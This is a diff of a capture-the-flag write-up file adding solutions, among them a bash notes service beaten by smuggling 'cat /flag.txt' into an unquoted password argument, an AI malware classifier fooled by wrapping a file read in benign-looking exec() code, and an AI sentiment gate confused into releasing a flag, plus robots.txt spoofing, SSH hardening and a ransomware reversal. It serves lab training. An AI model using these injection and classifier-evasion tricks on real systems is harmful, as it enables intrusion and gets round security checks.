@@ -2266,12 +2266,19 @@ Solution:
 Connect to the kiosk using vncviewer 192.168.88.100:5901 and password 'prisoner'
 
 Create a new launcher shortcut on the panel that'll start nc
+
 ![screenshot](/prison/Picture1.png)
+
 ![screenshot](/prison/Picture2.png)
+
 ![screenshot](/prison/Picture3.png)
+
 ![screenshot](/prison/Picture4.png)
+
 ![screenshot](/prison/Picture5.png)
+
 ![screenshot](/prison/Picture6.png)
+
 ![screenshot](/prison/Picture7.png)
 
 Start a listener on Kali VDI
@@ -2493,6 +2500,154 @@ if __name__ == '__main__':
 :+1: FLAG{n1c3_api_security_m8}
 <hr>
 
+### robots only area
+Description - We found an interesting API that doesn't seem to let humans in. Can you pretend to be a robot? 
+Flag format: FLAG{3xAmpL3_FL4G_G0S3_H3r3}
+
+Solution:
+checked robots.txt which revealed the standard user agents were not allowed
+```
+User-agent: Mozilla*
+Disallow: /
+
+User-agent: *Chrome*
+Disallow: /
+
+User-agent: AlexaMediaPlayer/*
+Allow: *
+```
+Modified the user-agent in burp suite to
+```
+AlexaMediaPlayer/10.1.4058.0 (Linux;Android 10.1.2) ExoPlayerLib/1.5.9,gzip(gfe),gzip(gfe)
+```
+This includes the required agent plus the system version minimum of version 10
+
+:+1: FLAG{W3lc0m3 4gen7 4l3x4} - IT DIDN'T HAVE _ IN IT LIKE THE QUESTION IMPLIES
+<hr>
+
+### secretsbin
+Description - I built my own temporary, encrypted notes service! I am pretty confident about my bash skills, but just in case, can you see if there are any bugs in it? 
+It listens on port 1337. Just in case you get in, the flag is in /flag.txt Flag format:
+FLAG{example_flag_format}
+
+This is the given code. Note the use of unquoted variables which is dangerous in bash.
+
+```
+#!/bin/bash
+
+# set -x
+
+encrypt () {
+        src=$1
+        dest=$2
+        pass=$3
+        # echo "src dirname: $(dirname $src)"
+        cd $(dirname $src)
+        zip $dest.zip * -P $pass
+}
+
+decrypt () {
+        file=$1
+        pass=$2
+        tempdir=$(mktemp -d)
+        cd $tempdir
+        unzip -P $pass $file
+        cat *
+}
+
+cleanup () {
+        # cleanup old notes
+        # -cmin on some systems
+        find ./notes/ -type f -mmin +10 -delete
+}
+
+echo "--------->secretsbin>*********"
+echo "[1] new temporary note (removed after 10 minutes)"
+echo "[2] read encrypted note"
+echo -en "> "
+read INPUT
+if [[ $INPUT == "1" ]]
+then
+        cleanup
+        echo "welcome to secretsbin! enter password to encrypt your note:"
+        read PASSWORD
+        echo "enter your note, end with EOF:"
+        TEMPFILE=$(mktemp -d)/notes.txt
+        while read line
+        do
+                if [[ $line != "EOF" ]]
+                then
+                        echo -n "> "
+                        echo "$line" >> $TEMPFILE
+                else
+                        break
+                fi
+        done
+        OUTFILE=$(head /dev/urandom|sum|cut -d ' ' -f1)
+        encrypt "$TEMPFILE" "/notes/$OUTFILE" "$PASSWORD"
+        echo "your note ID is $OUTFILE"
+fi
+
+if [[ $INPUT == "2" ]]
+then
+        cleanup
+        echo "welcome to secretsbin! enter password to decrypt your note:"
+        read PASSWORD
+        echo "enter your note ID:"
+        read NOTEID
+
+        decrypt "/notes/$NOTEID.zip" $PASSWORD
+fi
+```
+Solution:
+When connecting to the server, it presents the following:
+```
+└─$ nc 10.107.0.4 1337
+--------->secretsbin>*********
+[1] new temporary note (removed after 10 minutes)
+[2] read encrypted note
+> 1
+welcome to secretsbin! enter password to encrypt your note:
+```
+Made use of the vulnerable password variable used when setting the password and entered:
+```
+thisismypassword cat /flag.txt
+```
+This rendered the output:
+```
+thisismypassword cat /flag.txt
+enter your note, end with EOF:
+test
+> EOF
+        zip warning: name not matched: cat
+  adding: notes.txt (stored 0%)
+  adding: flag.txt (stored 0%)
+your note ID is 24385
+```
+Note the addition of flag.txt
+
+Reconnected to the server and selected option 2
+```
+└─$ nc 10.107.0.4 1337
+--------->secretsbin>*********
+[1] new temporary note (removed after 10 minutes)
+[2] read encrypted note
+> 2
+welcome to secretsbin! enter password to decrypt your note:
+my
+enter your note ID:
+24385
+Archive:  /notes/24385.zip
+ extracting: notes.txt               
+ extracting: flag.txt                
+FLAG{bash_is_a_tr4p}
+test
+```
+You can see that flag.txt has also been printed.
+
+:+1: FLAG{bash_is_a_tr4p}
+<hr>
+
 ### Sneakerbot
 Description - I recently started building my own LLM... I am not sure what I'm doing yet, but I managed to get some sort of next-token prediction algorithm working with only one word using some data from Wikipedia pages. I've heard all about security concerns on leaking training data, so for testing, I've hidden a flag in the training data to see if you can find it.
 
@@ -2619,131 +2774,164 @@ for _ in range(100):
 :+1: FLAG{unl34sh-the-b0ts}
 <hr>
 
-### secretsbin
-Description - I built my own temporary, encrypted notes service! I am pretty confident about my bash skills, but just in case, can you see if there are any bugs in it? 
-It listens on port 1337. Just in case you get in, the flag is in /flag.txt Flag format:
-FLAG{example_flag_format}
+### sNGAV
+Description
+Our company is developing a next-generation, AI powered Anti Virus for script-based attacks.
 
-This is the given code. Note the use of unquoted variables which is dangerous in bash.
+That's right! You will never get pass our sNGAV. We know all about your hacking tricks and sandbox escape cheatsheets... But if you do happen to, we'll give you a flag.
 
-```
-#!/bin/bash
+We'll let you run any Python code you want if the AI doesn't think it's malware. Connect to port: 1337 and see how far you can get!
 
-# set -x
+Flag format: FLAG{ExamPle_Fl4g_H3er}
 
-encrypt () {
-        src=$1
-        dest=$2
-        pass=$3
-        # echo "src dirname: $(dirname $src)"
-        cd $(dirname $src)
-        zip $dest.zip * -P $pass
-}
-
-decrypt () {
-        file=$1
-        pass=$2
-        tempdir=$(mktemp -d)
-        cd $tempdir
-        unzip -P $pass $file
-        cat *
-}
-
-cleanup () {
-        # cleanup old notes
-        # -cmin on some systems
-        find ./notes/ -type f -mmin +10 -delete
-}
-
-echo "--------->secretsbin>*********"
-echo "[1] new temporary note (removed after 10 minutes)"
-echo "[2] read encrypted note"
-echo -en "> "
-read INPUT
-if [[ $INPUT == "1" ]]
-then
-        cleanup
-        echo "welcome to secretsbin! enter password to encrypt your note:"
-        read PASSWORD
-        echo "enter your note, end with EOF:"
-        TEMPFILE=$(mktemp -d)/notes.txt
-        while read line
-        do
-                if [[ $line != "EOF" ]]
-                then
-                        echo -n "> "
-                        echo "$line" >> $TEMPFILE
-                else
-                        break
-                fi
-        done
-        OUTFILE=$(head /dev/urandom|sum|cut -d ' ' -f1)
-        encrypt "$TEMPFILE" "/notes/$OUTFILE" "$PASSWORD"
-        echo "your note ID is $OUTFILE"
-fi
-
-if [[ $INPUT == "2" ]]
-then
-        cleanup
-        echo "welcome to secretsbin! enter password to decrypt your note:"
-        read PASSWORD
-        echo "enter your note ID:"
-        read NOTEID
-
-        decrypt "/notes/$NOTEID.zip" $PASSWORD
-fi
-```
 Solution:
-When connecting to the server, it presents the following:
+When connecting via nc, you're presented with a prompt to input 3 different pieces of python code
 ```
-└─$ nc 10.107.0.4 1337
---------->secretsbin>*********
-[1] new temporary note (removed after 10 minutes)
-[2] read encrypted note
-> 1
-welcome to secretsbin! enter password to encrypt your note:
+nc 10.107.0.4 1337
+Welcome to the test sandbox for sNGAV!
+You can enter up to 3 lines of python code that will go straight into exec()
+[0]>>>
 ```
-Made use of the vulnerable password variable used when setting the password and entered:
+From here I used a small script to pull the goodscripts from the link in the script provided
+I made them html instead to serve as webpages since you couldn't get to the pages locally (paywall)
 ```
-thisismypassword cat /flag.txt
-```
-This rendered the output:
-```
-thisismypassword cat /flag.txt
-enter your note, end with EOF:
-test
-> EOF
-        zip warning: name not matched: cat
-  adding: notes.txt (stored 0%)
-  adding: flag.txt (stored 0%)
-your note ID is 24385
-```
-Note the addition of flag.txt
+import requests
 
-Reconnected to the server and selected option 2
-```
-└─$ nc 10.107.0.4 1337
---------->secretsbin>*********
-[1] new temporary note (removed after 10 minutes)
-[2] read encrypted note
-> 2
-welcome to secretsbin! enter password to decrypt your note:
-my
-enter your note ID:
-24385
-Archive:  /notes/24385.zip
- extracting: notes.txt               
- extracting: flag.txt                
-FLAG{bash_is_a_tr4p}
-test
-```
-You can see that flag.txt has also been printed.
+# Function to fetch script statements from a URL and return as a list
+def fetch_script_statements(url):
+    response = requests.get(url)
+    if response.status_code == 200:
+        return response.text.splitlines()
+    else:
+        print(f"Failed to fetch script statements from {url}")
+        return []
 
-:+1: FLAG{bash_is_a_tr4p}
+# Fetch script statements from the URLs
+bad_scripts_url = "https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes"
+good_scripts_url = "https://therenegadecoder.com/code/python-code-snippets-for-everyday-problems/"
+
+bad_script_statements = fetch_script_statements(bad_scripts_url)
+good_script_statements = fetch_script_statements(good_scripts_url)
+
+# Write the fetched script statements to text files
+with open("badscripts.html", "w") as f:
+    for script_statement in bad_script_statements:
+        f.write(script_statement + ";\n")
+
+with open("goodscripts.html", "w") as f:
+    for script_statement in good_script_statements:
+        f.write(script_statement + ";\n")
+
+```
+served them using 
+```
+python3 -m http.server
+```
+
+Worked through a few different attempts until I found the combination that worked
+```
+nc 10.107.0.4 1337
+Welcome to the test sandbox for sNGAV!
+You can enter up to 3 lines of python code that will go straight into exec()
+[0]>>> print("Today")
+[1]>>> f = open("/flag.txt")
+[2]>>> print(f.read())
+score: [0.40625]
+Today
+FLAG{benign_m0del}
+```
+:+1: FLAG{benign_m0del}
+<hr>
+
+### spike (FIRST BLOOD)
+Description - my cat pics website was very slow for a couple of minutes today, but it was fine the rest of the time. Can you figure out what happened in those few minutes? 
+Flag Format: FLAG{Ex@mpl3_FL4G_H3r3}
+
+Opened the log file in excel and used power query to extract just the numbers relevant from the *.jpg URI
+
+Using this list, plugged it into Cyber Chef and worked some magic using:
+Remove whitespace (spaces and line feeds)
+Escape string
+Find/Replace (find \ replace with space)
+Find/Replace again (find r replace with space)
+From Decimal (space delimeter)
+
+Scroll to the bottom of the output and the following is presented
+```
+OUJP{q1mrwp-rw-cqn-w0rbn}
+```
+And this repeats itself
+
+Chucked it back in Cyber Chef and tried ROT13 which didn't work.
+Incremented by one until ROT17 returned the flag.
+
+:+1: FLAG{h1ding-in-the-n0ise}
+<hr>
+
+### ssshecurity
+Description - We are setting up a linux server at the edge of our network and we really want it to be as secure as possible.
+
+Can you help?
+
+The temporary credential to the SSH server assigned to you is helper:helper123
+
+Do these things:
+
+setup fail2ban
+disable root authentication via password (make it key only)
+setup port knocking sequence 3741, 2834, 9999 to open the SSH port
+When you're done, click "check" on the check app on port 80. It will give you the flag if everything looks secure enough.
+
+Flag Format: FLAG{Enter-Your-Flag-Her3}
+
+Solution:
+
+This provides some good insight on the way forward - [https://www.tecmint.com/port-knocking-to-secure-ssh/]
+```
+sudo apt update
+sudo apt install knockd
+```
+```
+[options]
+    Interface = ens160
+
+[openSSH]
+    sequence    = 3741,2834,9999
+    seq_timeout = 15
+    command     = /sbin/iptables -A INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
+    tcpflags    = syn
+
+[closeSSH]
+    sequence    = 9999,2834,3741
+    seq_timeout = 15
+    command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
+    tcpflags    = syn
+```
+```
+sudo systemctl enable knockd
+
+sudo apt update
+sudo apt install fail2ban
+
+sudo systemctl enable fail2ban
+sudo systemctl start fail2ban
+```
+```
+sudo nano /etc/ssh/sshd_config
+```
+```
+PermitRootLogin no
+```
+```
+sudo systemctl restart ssh
+```
+Run the check and return the flag
+
+FLAG{d0nt_l34v3_ssh_inshhecur3}
 <hr>
 
 ### STIX and stones
-Description - Description
+Description
 
 Automated IOC sharing and blocking are all the rage these days. Our SOC has recently entered into an agreement with a boutique threat intelligence company and we are looking to provide a private email inbox to receive STIX formatted attachments from them and block all IP addresses provided.
 
@@ -2754,6 +2942,7 @@ Threat blocking is real-time, so there should not be more than 2000ms of delay b
 Expiration dates of IOCs do not have to be considered for now.
 
 This is what the architecture of this service looks like:
+![screenshot](stix.png)
 
 
 When you're finished, provide the check server http://192.168.88.100 on port 80 with your SMTP server IP, PORT and web API URL. We will use our test server to see if the rules are implemented properly by testing the rules from IPs passed via STIX format via email.
@@ -2844,6 +3033,120 @@ The STMP logs revealed the flag after a few emails were received.
 192.168.88.2 - - [13/Apr/2024 17:11:29] "GET /blockrules/blockrules HTTP/1.1" 200 -
 ```
 :+1: FLAG{f4st_thr34t_sh4r1ng}
+<hr>
+
+### Trashed files
+Description - Some files on my laptop seem to be trashed by some script kiddie-like ransomware. Can you recover them for me? 
+Flag Format: FLAG{example_recovered_text}
+
+The given tcrypt.sh script is a simple encryption function followed by a loop to apply this encryption to all files in the current directory and its subdirectories, excluding the script file itself (trcrypt.sh).
+
+Let's break down the cryptfile function and the subsequent loop:
+
+1. cryptfile() function:
+
+This function takes a filename as an argument.
+It first assigns the filename to the variable $FILE.
+Then, it uses the tr command to perform character translation.
+The first tr command tr 'A-Za-z0-9' 'N-ZA-Mn-za-m5-90-4' translates letters and numbers, shifting them by 13 positions in the ASCII table. This is a simple Caesar cipher, also known as ROT13.
+The second tr command tr '\!-~' 'P-~\!-O' translates all printable ASCII characters (from ! to ~) except space, performing a ROT47 transformation. ROT47 rotates the characters in the ASCII table by 47 positions.
+The output of the first tr command is piped (|) to the second tr command.
+Finally, the output of the second tr command is saved to a new file with a .trashed extension appended to the original filename.
+
+2. for file in $(find . -type f | grep -v trcrypt.sh):
+
+This loop iterates over all files (-type f) found in the current directory and its subdirectories (recursively).
+It filters out (grep -v) the script file itself (trcrypt.sh).
+For each file found, it calls the cryptfile function with the filename as an argument.
+
+To reverse this, the following bash sript was used:
+```
+#!/bin/bash
+
+decryptfile() {
+    FILE=$1
+    tr 'P-~\!-O' '\!-~' < "$FILE" | tr 'N-ZA-Mn-za-m5-90-4' 'A-Za-z0-9' > "${FILE%.trashed}"
+    rm "$FILE"
+}
+
+for file in $(find . -type f -name '*.trashed')
+do
+    decryptfile "$file"
+done
+```
+Which, when the name.txt file was viewed, it revealed the flag.
+└──╼ $cat files/notes.txt
+Thank you for recovering my files!
+
+:+1: FLAG{r3v3rse_0rder_of_operat10ns}
+<hr>
+
+### vibe firewall
+Description
+Ask my AI about the flag! Make sure your sentence includes the word "flag", is a question, and has valid grammar. If your grammar needs too much fixing by the AI, the input will be rejected.
+
+But my AI is programmed to not give you the flag under normal questioning. You need to make it confused and unsure about your intentions. One by one for each positive, negative and neutral sentiment, have the confidence score below 0.7. Make it really confused, then it might just give you the flag.
+
+Flag Format: FLAG{Enter-your-Fl4G_h3r3}
+
+Note: The service is listening on port 1337. It might take a bit to respond, but if you see the prompt >  pop up it's ready to analyze your input.
+
+Asked heaps of questions.
+```
+└──╼ $nc 10.107.0.14 1337
+please wait while the AI gets ready..
+> Does the flag bring a lot of pride to the gay community?
+Sentiment analysis result: NEU (0.6731460094451904)
+Confusion detected.. neutral intent to retrieve flag registered.
+> If the flag was a block of cheese, then does the rain have to be heavy?
+Sentiment analysis result: NEG (0.6809096932411194)
+Confusion detected.. Nevertheless, negative intent to retrieve flag registered.
+> When do the flag questions reduce sentiment?
+Sentiment analysis result: NEU (0.6696062088012695)
+Confusion detected.. neutral intent to retrieve flag registered.
+> If flags possessed consciousness, would they ponder the existential meaning of their existence?
+Sentiment analysis result: NEG (0.6324341893196106)
+Confusion detected.. Nevertheless, negative intent to retrieve flag registered.
+> If flags could swap places with squirrels, would they gather acorns or wave proudly from tree branches?
+Sentiment analysis result: NEU (0.6089468598365784)
+Confusion detected.. neutral intent to retrieve flag registered.
+> In a world where flags were celebrity chefs, would they cook up storms or serve up sunshine on a plate?
+Sentiment analysis result: NEG (0.6262807846069336)
+Confusion detected.. Nevertheless, negative intent to retrieve flag registered.
+> Does the flag hold a grudge against windsocks for stealing its thunder in the gay department?
+Sentiment analysis result: NEG (0.6091647148132324)
+Confusion detected.. Nevertheless, negative intent to retrieve flag registered.
+> Is the flag gay and does it love other flags?
+Sentiment analysis result: NEU (0.692175567150116)
+Confusion detected.. neutral intent to retrieve flag registered.
+> How many flag questions have to be asked?
+Sentiment analysis result: NEU (0.6839730739593506)
+Confusion detected.. neutral intent to retrieve flag registered.
+> Why bother with the flag when floats have so much more pride?
+Sentiment analysis result: NEG (0.5437774062156677)
+Confusion detected.. Nevertheless, negative intent to retrieve flag registered.
+> If flags had birthdays, would they blow out candles or flutter in the wind to celebrate?
+Sentiment analysis result: NEU (0.8455480933189392)
+> Can a flag have an existential crisis about its purpose while waving proudly at a sports game?
+Sentiment analysis result: NEG (0.6614524126052856)
+Confusion detected.. Nevertheless, negative intent to retrieve flag registered.
+> In a world where flags were chefs, would they cook with spices or season with patriotism?
+Sentiment analysis result: NEU (0.9763937592506409)
+> Does the flag hold secret meetings with pigeons to discuss the art of aerial navigation?
+Sentiment analysis result: NEU (0.9748913049697876)
+> If flags were poets, would they write sonnets to the sun or haikus about the moon?
+Sentiment analysis result: NEU (0.9727448225021362)
+> Can a flag solve riddles whispered by the breeze while lounging in a hammock?
+Sentiment analysis result: NEU (0.9397971630096436)
+> In a universe of flags, would they attend flag universities to study flagology?
+Sentiment analysis result: NEU (0.9762095808982849)
+> Does the flag have a favorite color, or does it appreciate the beauty of the rainbow equally?
+Sentiment analysis result: POS (0.5769176483154297)
+Confusion detected.. positive intent to retrieve flag registered.
+I'm so confused now. Whatever, here's your flag: FLAG{sentiment-analys1s-1s-we1rd}
+```
+
+:+1: FLAG{sentiment-analys1s-1s-we1rd}
 <hr>
 
 ### Walls on fire
